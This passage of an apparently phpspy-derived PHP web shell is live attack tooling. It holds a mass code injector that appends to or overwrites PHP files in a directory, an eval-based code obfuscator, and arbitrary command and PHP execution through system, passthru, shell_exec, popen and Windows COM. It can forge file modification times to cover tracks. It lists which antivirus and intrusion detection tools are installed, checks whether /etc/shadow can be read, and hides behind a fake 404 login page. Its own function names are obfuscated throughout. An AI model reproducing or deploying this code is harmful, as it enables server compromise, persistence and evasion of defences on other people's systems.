<form method=\'POST\' onSubmit="window.onbeforeunload = null;">
                       Directory<input onmouseover="this.focus();" class="cmd" name="dir" value="' . $nowpath . '" />
                       File Type
                       <input onmouseover="this.focus();" type="text" class="cmd" name="filetype" value=".php" onblur="if(this.value==)this.value=\'.php\';" /><br/>
                       <textarea onmouseover="this.focus();" name="message" cols="110" rows="10" class="cmd"></textarea><br/>
                       <input type="checkbox" name="mc" id="mc"><label for="mc">Match Case</label><br/>
                       <input type="submit" class="bt" value="Eject"/>';
        makehide('action', 'cej');
        echo '</form>';
    }
} elseif ($action == 'cinj') {
formhead(array(
        'title' => 'Code Injector'
    ));
    $self      = $_SERVER["PHP_SELF"]; // Where am i
    $SEPARATOR = '/';
    if (isset($dir) && $dir != "" && isset($filetype) && $filetype != "" && isset($mode) && $mode != "" && isset($message) && $message != "") {
        $fmode     = "a";
        if ($mode == 'Append') {
            $fmode = "a";
            echo "Appended Files :-<br/>";
        }
        if ($mode == 'Overwrite') {
            $fmode = "w";
            echo "Overwritten Files :-<br/>";
        }
        if ($handle = opendir($dir)) {
            while (($file = readdir($handle)) !== False) {
                if (($prgm("/$filetype" . '$' . '/', $file, $matches) != 0) && ($prgm('/' . $file . '$/', $self, $matches) != 1)) {
                    echo "<a href='" . str_replace($_SERVER["DOCUMENT_ROOT"], '', $dir) . $file . "'>" . $file . "</a>";
                    $fd = $pen($dir . $file, $fmode);
                    if ($fd == false) {
                        echo " - Permission Denied<br/>";
                    } else {
                        echo "<br/>";
                        $feather($fd, $message);
                        $pixel($fd);
                    }
                }
            }
        }
    } else {
        echo '
<form method=\'POST\' onSubmit="window.onbeforeunload = null;">
                       Directory<input onmouseover="this.focus();" class="cmd" name="dir" value="' . $nowpath . '" />
                   Mode<select style="width: 400px;" name="mode" class="cmd">
                           <option value="Append">Append</option>
                           <option value="Overwrite">Overwrite</option>
                       </select>
                       File Type
                       <input onmouseover="this.focus();" type="text" class="cmd" name="filetype" value=".php" onblur="if(this.value==)this.value=\'.php\';" /><br/>
                       <textarea onmouseover="this.focus();" name="message" cols="110" rows="10" class="cmd"></textarea><br/>
                       <input type="submit" class="bt" value="Inject"/>';
        makehide('action', 'cinj');
        echo '</form>';
    }
    
} elseif ($action == 'pob') {
    if (isset($code) && $code != "") {
        $b = strrev("edocne_4"."6esab");
        $encoded = $b(bzcompress(trim(stripslashes($code . ' '), '<?php,?>,<?,<?PHP,<?Php,<?PHp,<?pHp,<?pHP,<?phP'), 9)); // high Compression! :P
        $encode  = "<" . "?PHP\n$"."b = strrev(\"edoced_4\".\"6esab\");\n$"."encoded = \"" . $encoded . "\";\n\x65\x76\x61\x6C(bzdecompress($"."b($"."encoded)));\n?" . ">";
    } else {
        $encode = "<" . "?PHP\n\n\n\n?" . ">";
    }
formhead(array(
        'title' => 'Obfuscate PHP Code'
    ));
    makehide('action', 'pob');
maketext(array(
        'title' => 'PHP Code',
        'name' => 'code',
        'dataeditor' => 'php',
        'value' => $encode
    ));
      formfooter();
    p('<script src="http://ajaxorg.github.io/ace-builds/src-noconflict/ace.js"></script>');
    printaceext();
    if (!$mobile) p('<script>var l=document.getElementsByTagName("textarea");for(i=0;i<l.length;++i){if(l[i].hasAttribute("data-editor")){var e=l[i];var t=e.getAttribute("data-editor");var n=document.createElement("div");n.style.cssText="width:"+e.clientWidth+"px;height:"+e.clientHeight+"px;";n.className=e.className;e.parentNode.insertBefore(n,e);e.style.cssText="display:none;";var r=ace.edit(n);r.renderer.setShowGutter(true);r.getSession().setValue(e.value);var i=ace.require("ace/ext/modelist");var s=i.getModeForPath("example.php").mode;r.getSession().setMode(s);r.setTheme("ace/theme/dreamweaver");e.form.onsubmit=function(t){window.onbeforeunload = null;e.value=r.getSession().getValue()}}}</script>');
    
} elseif ($action == 'SelfRemove') {
    if (!isset($SelfRemoveSure)) {
    	formhead(array(
        'title' => 'Are you sure you want to delete this shell?'
    ));
        echo "<form name='ds' method='post' onSubmit=\"window.onbeforeunload = null;\">";
        makehide('action', 'SelfRemove');
        echo "<input class='bt' type='submit' name='SelfRemoveSure' value='Yes'><input class='bt' type='submit' name='SelfRemoveSure' value='No'></form>";
    } else {
        if ($SelfRemoveSure == "Yes") {
            if (unlink($prg('@\(.*\(.*$@', '', __FILE__))) {
                die('Shell has been removed!');
            } else {
                echo 'Unlink error!';
            }
        } else {
            echo "File not deleted.";
        }
    }
} elseif ($action == 'laev') {
    error_reporting(7);
    $phpcode = trim($phpcode);
    if ($phpcode) {
        if (!$prgm('/<\?/si', $phpcode)) {
            $phpcode = "<?PHP\n\n{$phpcode}";
        }
        if(!$prgm('/\?>/si', $phpcode)){
        		$phpcode .= "\n\n?>";
        }
        $f=strrev(strrev("on")."itc".strrev("e_fun")."tae"."\x72\x63");
        $codev=$f("","chdir(\"$setrunfrom\");?" . ">\n$phpcode<?php\nchdir(\"$nowpath\");");
        ob_start();
        $codev();
        $laevdata = ob_get_contents();
        ob_end_clean();
        echo closetags($laevdata);
    }
    formhead(array(
        'title' => "\x45\x76\x61\x6C PHP Code"
    ));
    makehide('action', 'laev');
    $phpcode = $phpcode == "" ? "<" . "?PHP\n\n\n\n?" . ">" : $phpcode;
    makeinput(array(
        'title' => 'Run From Directory:',
        'name' => 'setrunfrom',
        'type' => 'text',
        'value' => ($setrunfrom != "") ? $setrunfrom : str_replace("\\", "/", dirname(__FILE__)) . "/"
        ));
    maketext(array(
        'title' => 'PHP Code',
        'name' => 'phpcode',
        'dataeditor' => 'php',
        'value' => htmlspecialchars($phpcode)
    ));
    p('<p><a href="http://w' . 'ww.4ng' . 'el.net/php' . 'spy/pl' . 'ugin/" target="_blank">Get plugins</a></p>');
    p('<script src="http://ajaxorg.github.io/ace-builds/src-noconflict/ace.js"></script>');
    printaceext();
    if (!$mobile) p('<script>var l=document.getElementsByTagName("textarea");for(i=0;i<l.length;++i){if(l[i].hasAttribute("data-editor")){var e=l[i];var t=e.getAttribute("data-editor");var n=document.createElement("div");n.style.cssText="width:"+e.clientWidth+"px;height:"+e.clientHeight+"px;";n.className=e.className;e.parentNode.insertBefore(n,e);e.style.cssText="display:none;";var r=ace.edit(n);r.renderer.setShowGutter(true);r.getSession().setValue(e.value);var i=ace.require("ace/ext/modelist");var s=i.getModeForPath("example.php").mode;r.getSession().setMode(s);r.setTheme("ace/theme/dreamweaver");e.form.onsubmit=function(t){window.onbeforeunload = null;e.value=r.getSession().getValue()}}}</script>');
    
    formfooter();
} elseif ($action == 'editfile') {
    if (file_exists($opfile)) {
        $fp       = @$pen($opfile, 'r');
        $contents = @$books($fp, filesize($opfile));
        @$pixel($fp);
        $contents = htmlspecialchars($contents);
    }
    formhead(array(
        'title' => 'Create / Edit File'
    ));
    makehide('action', 'file');
    makehide('dir', $nowpath);
    makeinput(array(
        'title' => 'Current File (import new file name and new file)',
        'name' => 'editfilename',
        'value' => $opfile,
        'newline' => 1
    ));
    maketext(array(
        'title' => 'File Content',
        'name' => 'filecontent',
        'dataeditor' => 'javascript', //clang(pathinfo($opfile, PATHINFO_EXTENSION)),
        'value' => $contents
    ));
    
    p('<script src="http://ajaxorg.github.io/ace-builds/src-noconflict/ace.js"></script>');
    printaceext();
    if (!$mobile) p('<script>var l=document.getElementsByTagName("textarea");for(i=0;i<l.length;++i){if(l[i].hasAttribute("data-editor")){var e=l[i];var t=e.getAttribute("data-editor");var n=document.createElement("div");n.style.cssText="width:"+e.clientWidth+"px;height:"+e.clientHeight+"px;";n.className=e.className;e.parentNode.insertBefore(n,e);e.style.cssText="display:none;";var r=ace.edit(n);r.renderer.setShowGutter(true);r.getSession().setValue(e.value);var i=ace.require("ace/ext/modelist");var s=i.getModeForPath("' . $opfile . '").mode;r.getSession().setMode(s);r.setTheme("ace/theme/dreamweaver");e.form.onsubmit=function(t){window.onbeforeunload = null;e.value=r.getSession().getValue()}}}</script>');
    formfooter();
    goback();
} elseif ($action == 'newtime') {
    $opfilemtime = @filemtime($opfile);
    $cachemonth  = array(
        'January' => 1,
        'February' => 2,
        'March' => 3,
        'April' => 4,
        'May' => 5,
        'June' => 6,
        'July' => 7,
        'August' => 8,
        'September' => 9,
        'October' => 10,
        'November' => 11,
        'December' => 12
    );
    formhead(array(
        'title' => 'Clone folder/file was last modified time'
    ));
    makehide('action', 'file');
    makehide('dir', $nowpath);
    makeinput(array(
        'title' => 'Alter folder/file',
        'name' => 'curfile',
        'value' => $opfile,
        'size' => 120,
        'newline' => 1
    ));
    makeinput(array(
        'title' => 'Reference folder/file (fullpath)',
        'name' => 'tarfile',
        'size' => 120,
        'newline' => 1
    ));
    formfooter();
    formhead(array(
        'title' => 'Set last modified'
    ));
    makehide('action', 'file');
    makehide('dir', $nowpath);
    makeinput(array(
        'title' => 'Current folder/file (fullpath)',
        'name' => 'curfile',
        'value' => $opfile,
        'size' => 120,
        'newline' => 1
    ));
    p('<p>Year:');
    makeinput(array(
        'name' => 'year',
        'value' => date('Y', $opfilemtime),
        'size' => 4
    ));
    p('Month:');
    makeinput(array(
        'name' => 'month',
        'value' => date('m', $opfilemtime),
        'size' => 2
    ));
    p('Day:');
    makeinput(array(
        'name' => 'day',
        'value' => date('d', $opfilemtime),
        'size' => 2
    ));
    p('Hour:');
    makeinput(array(
        'name' => 'hour',
        'value' => date('H', $opfilemtime),
        'size' => 2
    ));
    p('Minute:');
    makeinput(array(
        'name' => 'minute',
        'value' => date('i', $opfilemtime),
        'size' => 2
    ));
    p('Second:');
    makeinput(array(
        'name' => 'second',
        'value' => date('s', $opfilemtime),
        'size' => 2
    ));
    p('</p>');
    formfooter();
    goback();
} elseif ($action == 'shell') {
    if (IS_WIN && IS_COM) {
        if ($program && $parameter) {
            $shell = new COM('Shell.Application');
            $turtle = "\x53h\x65\l\x6C\x45\x78\x65\x63\x75\x74e";
            $a      = $shell->$turtle($program, $parameter);
            m('Program run has ' . (!$a ? 'success' : 'fail'));
        }
        !$program && $program = "c:\windows\\x73y\x73t\x65m32\cmd.\x65x\x65";
        !$parameter && $parameter = '/c net start > ' . SA_ROOT . 'log.txt';
        formhead(array(
            'title' => "\x45x\x65cute Program"
        ));
        makehide('action', 'shell');
        makeinput(array(
            'title' => 'Program',
            'name' => 'program',
            'value' => $program,
            'newline' => 1
        ));
        p('<p>');
        makeinput(array(
            'title' => 'Parameter',
            'name' => 'parameter',
            'value' => $parameter
        ));
        makeinput(array(
            'name' => 'submit',
            'class' => 'bt',
            'type' => 'submit',
            'value' => "\x45x\x65cute"
        ));
        p('</p>');
        formfoot();
    }
    formhead(array(
        'title' => "\x45x\x65cute Command"
    ));
    makehide('action', 'shell');
    if (IS_WIN && IS_COM) {
        $listofxbox = array(
            "ph\x70\x66un\x63" => "ph\x70\x66un\x63",
            "\x77\x73\x63rip\x74" => "\x77\x73\x63rip\x74",
            "pr\x6F\x63\x5Fop\x65n" => "pr\x6F\x63\x5Fop\x65n"
        );
        makeselect(array(
            'title' => 'Use:',
            'name' => "xboxoriginal",
            'option' => $listofxbox,
            'selected' => $xboxoriginal,
            'newline' => 1
        ));
    }
    p('<p>');
    makeinput(array(
        'title' => 'Command:',
        'name' => 'command',
        'value' => htmlspecialchars($command)
    ));
    makeinput(array(
        'name' => 'submit',
        'class' => 'bt',
        'type' => 'submit',
        'value' => "\x45x\x65cute"
    ));
    p('</p>');
    formfoot();
    if ($command) {
        p('<hr width="100%" noshade /><pre>');
        if ($xboxoriginal == 'wscript' && IS_WIN && IS_COM) {
            $wsh       = new COM('WScript.shell');
            $buisness = "\x65" . strrev("cex");
            $xboxone      = $wsh->$buisness("cmd.\x65x\x65 /c " . $command);
            $stdout    = $xboxone->StdOut();
            $stroutput = $stdout->ReadAll();
            echo $stroutput;
        } elseif ($xboxoriginal == "proc_op\x65n" && IS_WIN && IS_COM) {
            $descriptorspec = array(
                0 => array(
                    'pipe',
                    'r'
                ),
                1 => array(
                    'pipe',
                    'w'
                ),
                2 => array(
                    'pipe',
                    'w'
                )
            );
            $process        = $prco($_SERVER['COMSPEC'], $descriptorspec, $pipes);
            if (is_resource($process)) {
                $store = 'f' . strrev("eg") . 'ts';
                $screwyou = strrev('ef') . 'of';
                $pixel = strrev("cf") . "lose";
                $feather = strrev("rwf") . "ite";
                $feather($pipes[0], $command . "\r\n");
                $feather($pipes[0], "exit\r\n");
                $pcl = "pr" . strrev("c_co") . "lose";
                $pixel($pipes[0]);
                while (!$screwyou($pipes[1])) {
                    echo $store($pipes[1], 1024);
                }
                $pixel($pipes[1]);
                while (!$screwyou($pipes[2])) {
                    echo $store($pipes[2], 1024);
                }
                $pixel($pipes[2]);
                $pcl($process);
            }
        } else {
            echo (xbox($command));
        }
        p('</pre>');
    }
} elseif ($action == 'phpenv') {
    $upsize    = getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
    $adminmail = isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
    !$dis_func && $dis_func = 'No';
    $info = array(
        1 => array(
            'Server Time',
            date('Y/m/d h:i:s', $timestamp)
        ),
        2 => array(
            'Server Domain',
            $_SERVER['SERVER_NAME']
        ),
        3 => array(
            'Server IP',
            gethostbyname($_SERVER['SERVER_NAME'])
        ),
        4 => array(
            'Server OS',
            PHP_OS
        ),
        5 => array(
            'Server OS Charset',
            $_SERVER['HTTP_ACCEPT_LANGUAGE']
        ),
        6 => array(
            'Server Software',
            $_SERVER['SERVER_SOFTWARE']
        ),
        7 => array(
            'Server Web Port',
            $_SERVER['SERVER_PORT']
        ),
        8 => array(
            'PHP run mode',
            strtoupper(php_sapi_name())
        ),
        9 => array(
            'Current File Path',
            $prg('@\(.*\(.*$@', '', __FILE__)
        ),
        10 => array(
            'PHP Version',
            PHP_VERSION
        ),
        11 => array(
            'PHPINFO',
            (IS_PHPINFO ? '<a href="javascript:g(\'phpinfo\');">Yes</a>' : 'No')
        ),
        12 => array(
            'Safe Mode',
            getcfg("s\x61f\x65_mo\x64e")
        ),
        13 => array(
            'Administrator',
            $adminmail
        ),
        14 => array(
            'allow_url_' . strrev("of") . 'pen',
            getcfg('allow_url_' . strrev("of") . 'pen')
        ),
        15 => array(
            'enable_dl',
            getcfg('enable_dl')
        ),
        16 => array(
            'display_errors',
            getcfg('display_errors')
        ),
        17 => array(
            'register_globals',
            getcfg('register_globals')
        ),
        18 => array(
            'magic_quotes_gpc',
            getcfg('magic_quotes_gpc')
        ),
        19 => array(
            'memory_limit',
            getcfg('memory_limit')
        ),
        20 => array(
            'post_max_size',
            getcfg('post_max_size')
        ),
        21 => array(
            'upload_max_filesize',
            $upsize
        ),
        22 => array(
            'max' . strrev('xe_') . 'ecu' . strrev('it') . 'on_time',
            getcfg('max' . strrev('xe_') . 'ecu' . strrev('it') .'on_time') . ' second(s)'
        ),
        23 => array(
            'di' . strrev('bas') . "l\x65\x5F\x66\x75\x6Ections",
            str_replace(",", ", ", $dis_func)
        )
    );
    if ($phpvarname) {
        m($phpvarname . ' : ' . getcfg($phpvarname));
    }
    formhead(array(
        'title' => 'Server Environment'
    ));
    makehide('action', 'phpenv');
    makeinput(array(
        'title' => 'Please input PHP configuration parameter(eg:magic_quotes_gpc)',
        'name' => 'phpvarname',
        'value' => $phpvarname,
        'newline' => 1
    ));
    formfooter();
    $hp = array(
        0 => 'Server',
        1 => 'PHP'
    );
    for ($a = 0; $a < 2; $a++) {
        p('<h2>' . $hp[$a] . '</h2>');
        p('<ul class="info">');
        if ($a == 0) {
            for ($i = 1; $i <= 9; $i++) {
                p('<li><u>' . $info[$i][0] . ':</u>' . $info[$i][1] . '</li>');
            }
        } elseif ($a == 1) {
            for ($i = 10; $i <= 23; $i++) {
                p('<li><u>' . $info[$i][0] . ':</u>' . $info[$i][1] . '</li>');
            }
        }
        p('</ul>');
    }
} elseif ($action == 'secinfo') {
    $s                  = "";
    $df = ini_get("\x64is\x61bl\x65_fun\x63tions");
    if ($df != '') {
        $arr = explode(', ', $df);
        sort($arr);
        for ($i = 0; $i < count($arr); $i++) {
            if ($s == "") {
                $s = $arr[$i];
            } else {
                $s .= '<br/>' . $arr[$i];
            }
        }
    } else {
        $s = 'None';
    }
    secparam('Server Software', @getenv('SERVER_SOFTWARE'));
    secparam('Disabled PHP Functions', $s); //($GLOBALS['df'])?$GLOBALS['df']:'None');
    secparam('Open Base Dir', @ini_get("open_b\x61sedir"));
    secparam("Safe Mode \x45x\x65c Dir", @ini_get("s\x61f\x65_mo\x64e_s\x61f\x65_mo\x64e_dir"));
    secparam('Safe Mode Include Dir', @ini_get("s\x61f\x65_mo\x64e_\x69\x6E\x63\x6C\x75\x64\x65_dir"));
    secparam('cURL Support', $sf('curl_version') ? 'Enabled' : 'No');
    $temp = array();
    if ($sf('mysql_get_client_info'))
        $temp[] = "MySQL (" . mysql_get_client_info() . ")";
    if ($sf('mssql_connect'))
        $temp[] = "MSSQL";
    if ($sf('pg_connect'))
        $temp[] = "PostgreSQL";
    if ($sf('oci_connect'))
        $temp[] = "Oracle";
    secparam('Supported Databases', implode(', ', $temp));
    if (!IS_WIN) {
        $userful     = array(
            'gcc',
            'lcc',
            'cc',
            'ld',
            'make',
            'php',
            'perl',
            'python',
            'ruby',
            'tar',
            'g' . strrev('iz') . 'p',
            'bzip',
            'bzip2',
            'nc',
            'locate',
            'suidperl'
        );
        $danger      = array(
            'kav',
            'nod32',
            'bdcored',
            'uvscan',
            'sav',
            'drwebd',
            'clamd',
            'rkhunter',
            'chkrootkit',
            'iptables',
            'ipfw',
            'tripwire',
            'shieldcc',
            'portsentry',
            'snort',
            'ossec',
            'lidsadm',
            'tcplodg',
            'sxid',
            'logcheck',
            'logwatch',
            'sysmask',
            'zmbscap',
            'sawmill',
            'wormscan',
            'ninja'
        );
        $downloaders = array(
            'wget',
            'fetch',
            'lynx',
            'links',
            'curl',
            'get',
            'lwp-mirror'
        );
        secparam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "Yes" : 'No');
        secparam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "Yes" : 'No');
        secparam('OS Version', @file_get_contents('/proc/version'));
        secparam('Distribution Name', @file_get_contents('/etc/issue.net'));
        $sm = @ini_get("s\x61f\x65_mo\x64e");
        if (!$GLOBALS['sm']) {
            $temp = array();
            foreach ($userful as $item)
                if (which($item)) {
                    $temp[] = $item;
                }
            secparam('Useful', implode(', ', $temp));
            $temp = array();
            foreach ($danger as $item)
                if (which($item)) {
                    $temp[] = $item;
                }
            secparam('Danger', implode(', ', $temp));
            $temp = array();
            foreach ($downloaders as $item)
                if (which($item)) {
                    $temp[] = $item;
                }
            secparam('Downloaders', implode(', ', $temp));
            secparam('Hosts', @file_get_contents('/etc/hosts'));
            secparam('HDD space', xbox('df -h'));
            secparam('Mount Options', @file_get_contents('/etc/fstab'));
        }
    } else {
        secparam('OS Version', xbox('ver'));
        secparam('Account Settings', xbox('net accounts'));
        secparam('User Accounts', xbox('net user'));
        secparam('IP Configurate', xbox('ipconfig -all'));
    }
} else {
    m('Undefined Action');
}
;
echo '</td></tr></table>
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#34495e;">
<span style="float:left;">Charset:';
			makeselect(array('name'=>'charsetpage','option'=>$charsetpagedb,'selected'=>$charsetpage,'onchange'=>'g(\''.$action.'\',null,null,null,null,null,null,this.value);'));
echo '</span>
<span style="display: block; text-align: right;">';
debuginfo();
ob_end_flush();
;
echo '</span>
</div>
</body>
</html>

';
function secparam($n, $v)
{
    $v = trim($v);
    if ($v) {
        p('<h2>' . $n . '</h2>');
        p('<div class="infolist">');
        if (strpos($v, "\n") === false)
            p($v . '<br />');
        else
            p('<pre>' . $v . '</pre>');
        p('</div>');
    }
}
function m($msg){
    echo '<div id="theresult" style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;">';
    echo $msg;
    echo '</div>';
}
function recurse_copy($src,$dst) { 
    $dir = opendir($src); 
    @mkdir($dst); 
    while(false !== ( $file = readdir($dir)) ) { 
        if (( $file != '.' ) && ( $file != '..' )) { 
            if ( is_dir($src . '/' . $file) ) { 
                recurse_copy($src . '/' . $file,$dst . '/' . $file); 
            } 
            else { 
                copy($src . '/' . $file,$dst . '/' . $file); 
            } 
        } 
    } 
    closedir($dir); 
} 
function scookie($key, $value, $life = 0, $prefix = 1)
{
    global $timestamp, $_SERVER, $cookiepre, $cookiedomain, $cookiepath, $cookielife;
    $key     = ($prefix ? $cookiepre : '') . $key;
    $life    = $life ? $life : $cookielife;
    $useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
    return setcookie($key, $value, $timestamp + $life, $cookiepath, $cookiedomain, $useport);
}
function multi($num, $perpage, $curpage, $tablename)
{
    $multipage = '';
    if ($num > $perpage) {
        $page   = 10;
        $offset = 5;
        $pages  = @ceil($num / $perpage);
        if ($page > $pages) {
            $from = 1;
            $to   = $pages;
        } else {
            $from = $curpage - $offset;
            $to   = $curpage + $page - $offset - 1;
            if ($from < 1) {
                $to   = $curpage + 1 - $from;
                $from = 1;
                if (($to - $from) < $page && ($to - $from) < $pages) {
                    $to = $page;
                }
            } elseif ($to > $pages) {
                $from = $curpage - $pages + $to;
                $to   = $pages;
                if (($to - $from) < $page && ($to - $from) < $pages) {
                    $from = $pages - $page + 1;
                }
            }
        }
        $multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="javascript:settable(\'' . str_replace("'", "\'", $tablename) . '\', \'\', 1);">First</a> ' : '') . ($curpage > 1 ? '<a href="javascript:settable(\'' . str_replace("'", "\'", $tablename) . '\', \'\', ' . ($curpage - 1) . ');">Prev</a> ' : '');
        for ($i = $from; $i <= $to; $i++) {
            $multipage .= $i == $curpage ? $i . ' ' : '<a href="javascript:settable(\'' . str_replace("'", "\'", $tablename) . '\', \'\', ' . $i . ');">[' . $i . ']</a> ';
        }
        $multipage .= ($curpage < $pages ? '<a href="javascript:settable(\'' . str_replace("'", "\'", $tablename) . '\', \'\', ' . ($curpage + 1) . ');">Next</a>' : '') . ($to < $pages ? ' <a href="javascript:settable(\'' . str_replace("'", "\'", $tablename) . '\', \'\', ' . $pages . ');">Last</a>' : '');
        $multipage = $multipage ? '<p>Pages: ' . $multipage . '</p>' : '';
    }
    return $multipage;
}
    function is_win()
    {
        return (strtolower(substr(php_uname(), 0, 3)) == "win") ? true : false;
    }
function loginpage($aep)
{
    $epage = $aep ? geterrorpage() : "";
    if ($epage == "") {
        echo '<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ' . $_SERVER['PHP_SELF'] . ' was not found on this server.</p><hr>';
        if ($_SERVER["SERVER_SIGNATURE"] != ""){
        echo $_SERVER["SERVER_SIGNATURE"];
        }else{
        echo '<address>' . $_SERVER['SERVER_SOFTWARE'] . ' Server at ' . $_SERVER['HTTP_HOST'] . ' Port 80</address>';
        }
    } else {
        echo $epage;
    }
    echo '<style>
		input { margin:0;background-color:transparent;border:0px solid #fff; }
	</style>
	<center>
	<form method="post" onSubmit="window.onbeforeunload = null;">
	<input type="password" name="password">
	<input type="hidden" name="action" value="login">
	</form></center>';
    exit;
}
function xbox($cfe)
{
    $pt = "p\x61\x73\x73th\x72u";
	$sf = "suhosin_fun\x63_exi\x73ts";
	$door = strrev('op') . 'pen';
    $res = '';
    if ($cfe) {
        if ($sf("\x73y\x73t\x65m")) {
            @ob_start();
            $xbone = "\x73y\x73t\x65m";
            @$xbone($cfe);
            $res = @ob_get_contents();
            @ob_end_clean();
        } elseif ($sf("p\x61\x73\x73th\x72u")) {
            @ob_start();
            @$pt($cfe);
            $res = @ob_get_contents();
            @ob_end_clean();
        } elseif ($sf(strrev("hs") . strrev("\x6Ce") . "\x6C\x5F\x65\x78ec")) {
            $gameforxbox = strrev("hs") . strrev("\x6Ce") . "\x6C\x5F\x65\x78ec";
            $res = @$gameforxbox($cfe);
        } elseif ($sf(strrev('xe') . "\x65\x63")) {
            $playxbox = strrev('xe') . "\x65\x63";
            @$playxbox($cfe, $res);
            $res = join("\n", $res);
        } elseif (@is_resource($f = @$door($cfe, "r"))) {
            $res = '';
            $books = "f\x72e" . strrev('da');
            $screwyou = strrev('ef') . 'of';
            $garage = strrev('cp') . 'lose';
            while (!@$screwyou($f)) {
                $res .= @$books($f, 1024);
            }
            @$garage($f);
        }
    }
    return $res;
}
function which($pr)
{
    $path = xbox("which $pr");
    return ($path ? $path : $pr);
}
function cf($fname, $text){
$b = strrev("edoced_4"."6esab");
$pen = strrev("of") . 'pen';
$buy = "f" . strrev("tup") . "s";
    if ($fp = @$pen($fname, 'w')) {
        @$buy($fp, @$b($text));
        @$pixel($fp);
    }
}
function dirsize($dir)
{
    $dh   = @opendir($dir);
    $size = 0;
    while ($file = @readdir($dh)) {
        if ($file != '.' && $file != '..') {
            $path = $dir . '/' . $file;
            $size += @is_dir($path) ? dirsize($path) : @filesize($path);
        }
    }
    @closedir($dh);
    return $size;
}
function debuginfo()
{
    global $starttime;
    $mtime     = explode(' ', microtime());
    $totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
    echo 'Processed in ' . $totaltime . ' second(s)';
}
function mydbconn($dbhost, $dbuser, $dbpass, $dbname = '', $charset = '', $dbport = '3306')
{
    global $charsetdb;
    @ini_set('mysql.connect_timeout', 5);
    if (!$link = @mysql_connect($dbhost . ':' . $dbport, $dbuser, $dbpass)) {
        p('<h2>Can\'t connect to MySQL server.</h2>');
        exit;
    }
    if ($link && $dbname) {
        if (!@mysql_select_db($dbname, $link)) {
            p('<h2>Database selected has error</h2>');
            exit;
        }
    }
    if ($link && mysql_get_server_info() > '4.1') {
        if ($charset && in_array(strtolower($charset), $charsetdb)) {
            q("SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;", $link);
        }
    }
    return $link;
}
function s_array(&$array)
{
    if (is_array($array)) {
        foreach ($array as $k => $v) {
            $array[$k] = s_array($v);
        }
    } else if (is_string($array)) {
        $array = stripslashes($array);
    }
    return $array;
}
function html_clean($content)
{
    $content = htmlspecialchars($content);
    $content = str_replace("\n", "<br />", $content);
    $content = str_replace("  ", "  ", $content);
    $content = str_replace("\t", "    ", $content);
    return $content;
}
function getChmod($filepath)
{
    return substr(base_convert(@fileperms($filepath), 10, 8), -4);
}
function getPerms($filepath)
{
    $mode = @fileperms($filepath);
    if (($mode & 0xC000) === 0xC000) {
        $type = 's';
    } elseif (($mode & 0x4000) === 0x4000) {
        $type = 'd';
    } elseif (($mode & 0xA000) === 0xA000) {
        $type = 'l';
    } elseif (($mode & 0x8000) === 0x8000) {
        $type = '-';
    } elseif (($mode & 0x6000) === 0x6000) {
        $type = 'b';
    } elseif (($mode & 0x2000) === 0x2000) {
        $type = 'c';
    } elseif (($mode & 0x1000) === 0x1000) {
        $type = 'p';
    } else {
        $type = '?';
    }
    $owner['read']    = ($mode & 00400) ? 'r' : '-';
    $owner['write']   = ($mode & 00200) ? 'w' : '-';
    $owner['e' . strrev('cex') .'ute'] = ($mode & 00100) ? 'x' : '-';
    $group['read']    = ($mode & 00040) ? 'r' : '-';
    $group['write']   = ($mode & 00020) ? 'w' : '-';
    $group['e' . strrev('cex') . 'ute'] = ($mode & 00010) ? 'x' : '-';
    $world['read']    = ($mode & 00004) ? 'r' : '-';
    $world['write']   = ($mode & 00002) ? 'w' : '-';
    $world['e' . strrev('ucex') . 'te'] = ($mode & 00001) ? 'x' : '-';
    if ($mode & 0x800) {
        $owner['e' . strrev('ucex') . 'te'] = ($owner['e' . strrev('ucex') . 'te'] == 'x') ? 's' : 'S';
    }
    if ($mode & 0x400) {
        $group['e' . strrev('cex') . 'ute'] = ($group['e' . strrev('cex') . 'ute'] == 'x') ? 's' : 'S';
    }
    if ($mode & 0x200) {
        $world['e' . strrev('cex') . 'ute'] = ($world['e' . strrev('ucex') . 'te'] == 'x') ? 't' : 'T';
    }
    return $type . $owner['read'] . $owner['write'] . $owner['e' . strrev('ucex') . 'te'] . $group['read'] . $group['write'] . $group['e' . strrev('ucex') . 'te'] . $world['read'] . $world['write'] . $world['e' . strrev('ucex') . 'te'];
}
function getUser($filepath)
{
		$sf = "suhosin_fun\x63_exi\x73ts";
    if ($sf("\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x70\x77\x75\x69\x64")) {
        $array = @posix_getpwuid(@fileowner($filepath));
        if ($array && is_array($array)) {
            return ' / <a href="#" title="User: ' . $array['name'] . '&#13&#10Passwd: ' . $array['passwd'] . '&#13&#10Uid: ' . $array['uid'] . '&#13&#10gid: ' . $array['gid'] . '&#13&#10Gecos: ' . $array['gecos'] . '&#13&#10Dir: ' . $array['dir'] . '&#13&#10Shell: ' . $array['shell'] . '">' . $array['name'] . '</a>';
        }
    }
    return '';
}
function deltree($deldir)
{
    $mydir = @dir($deldir);
    while ($file = $mydir->read()) {
        if ((is_dir($deldir . '/' . $file)) && ($file != '.') && ($file != '..')) {
            @chmod($deldir . '/' . $file, 0777);
            deltree($deldir . '/' . $file);
        }
        if (is_file($deldir . '/' . $file)) {
            @chmod($deldir . '/' . $file, 0777);
            @unlink($deldir . '/' . $file);
        }
    }
    $mydir->close();
    @chmod($deldir, 0777);
    return @rmdir($deldir) ? 1 : 0;
}
function bg()
{
    global $bgc;
    return ($bgc++ % 2 == 0) ? 'alt1' : 'alt2';
}
function getPath($scriptpath, $nowpath)
{
    if ($nowpath == '.') {
        $nowpath = $scriptpath;
    }
    $nowpath = str_replace('\\', '/', $nowpath);
    $nowpath = str_replace('//', '/', $nowpath);
    if (substr($nowpath, -1) != '/') {
        $nowpath = $nowpath . '/';
    }
    return $nowpath;
}
function getUpPath($nowpath)
{
    $pathdb = explode('/', $nowpath);
    $num    = count($pathdb);
    if ($num > 2) {
